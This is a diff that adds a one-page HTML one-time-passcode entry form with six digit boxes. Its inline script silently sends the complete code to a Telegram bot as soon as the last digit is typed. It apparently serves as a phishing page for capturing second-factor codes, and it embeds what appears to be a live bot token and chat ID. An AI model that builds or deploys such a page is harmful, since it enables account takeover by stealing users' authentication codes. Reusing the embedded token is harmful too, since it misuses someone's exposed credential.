@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Page</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="otp-page">
+    <div class="otp-container">
+        <input type="text" maxlength="1" class="otp-box">
+        <input type="text" maxlength="1" class="otp-box">
+        <input type="text" maxlength="1" class="otp-box">
+        <input type="text" maxlength="1" class="otp-box">
+        <input type="text" maxlength="1" class="otp-box">
+        <input type="text" maxlength="1" class="otp-box">
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU';   // <-- Replace with your bot token locally
+        const CHAT_ID = '-4909990023';       // <-- Replace with your chat ID; add "-" if it's a group
+
+        const boxes = document.querySelectorAll('.otp-box');
+        let sent = false; // ensure OTP is sent only once
+
+        boxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                // Move focus automatically
+                if(box.value.length > 0 && index < boxes.length - 1){
+                    boxes[index + 1].focus();
+                }
+
+                // Collect OTP and send automatically when all boxes are filled
+                const otp = Array.from(boxes).map(b => b.value).join('');
+                if(otp.length === boxes.length && !sent){
+                    sent = true; // mark as sent
+                    const message = `OTP Submitted: ${otp}`;
+
+                    // Send OTP to Telegram
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                    })
+                    .then(() => console.log('OTP sent to Telegram'))
+                    .catch(err => console.log('Error sending OTP:', err));
+                }
+            });
+        });
+    </script>
+</body>
+</html>
